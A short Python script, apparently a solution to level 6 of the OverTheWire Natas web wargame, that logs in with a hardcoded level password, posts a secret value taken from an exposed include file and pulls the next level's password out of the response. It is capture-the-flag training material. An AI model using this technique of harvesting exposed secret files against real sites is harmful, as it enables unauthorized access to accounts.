from pwn import *
import requests
import re
import html

username = "natas6"
password = "aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1"
url = "http://{}.natas.labs.overthewire.org".format(username)

log.progress("Getting the natas7 password, Hold on! ")
session = requests.session()
#web = session.get(url + "/includes/secret.inc" , auth = (username, password)).text
web = session.post(url, auth = (username, password), data = {"secret" : "FOEIUWGHFEEUHOFUOIU", "submit" : "submit"}).text
cookies = session.cookies
#print(web)
#content = html.unescape(web)
#print(content)
print("The password for natas7 is === " + re.findall("[A-Za-z0-9]{32}", web)[1])
